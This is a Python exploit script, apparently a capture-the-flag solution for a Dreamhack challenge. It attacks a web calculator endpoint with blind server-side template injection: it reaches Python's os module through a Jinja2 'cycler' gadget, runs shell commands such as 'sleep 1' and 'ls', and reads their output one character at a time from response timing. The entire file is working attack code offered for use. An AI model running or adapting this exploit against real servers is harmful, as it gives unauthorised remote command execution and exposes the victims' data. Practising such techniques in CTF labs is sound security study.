import time
import requests
import string
import argparse

class BlindSSTI:
    def __init__(self, url, maxlen=200, timeout=3.0):
        self.url = url
        self.maxlen = maxlen
        self.timeout = timeout
        self.gadget = "cycler.__init__.__globals__.os"
        self.charset = string.ascii_letters + string.digits + "{}_-:/()[]=!@#$%^&*+., \n"

    def send(self, data):
        t0 = time.time()
        try:
            requests.post(self.url, data=data, timeout=self.timeout)
        except requests.RequestException:
            return self.timeout
        return time.time() - t0
    def calibrate(self):
        fast = self.send({"a": "0", "b": "0"})
        slow = self.send({"a": f"({self.gadget}.system('sleep 1'))", "b": "0"})
        self.threshold = (fast + slow) / 2
        print(f"[*] Calibrated: fast≈{fast:.3f}s  slow≈{slow:.3f}s  -> threshold={self.threshold:.3f}s")

    def build_payload(self, ch, idx):
        a = f"({self.gadget}.system('sleep 1') if ord({self.gadget}.popen('ls').read()[{idx}])=={ord(ch)} else 0)"
        return {"a": a, "b": "0"}

    def extract_output(self):
        out = ""
        for i in range(self.maxlen):
            found = False
            for ch in self.charset:
                dt = self.send(self.build_payload(ch, i))
                if dt >= self.threshold:
                    out += ch
                    print(f"[+] so far: {out!r}")
                    found = True
                    break
            if not found:
                print(f"[*] Done. Full output: {out!r}")
                break
        return out

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Target URL (e.g. http://host8.dreamhack.games:14476/cal)")
    args = parser.parse_args()
    exp = BlindSSTI(args.url)
    print(f"[+] Gadget OK: {exp.gadget}")
    exp.calibrate()
    result = exp.extract_output()
    print("\n[+] Final output:\n", result)
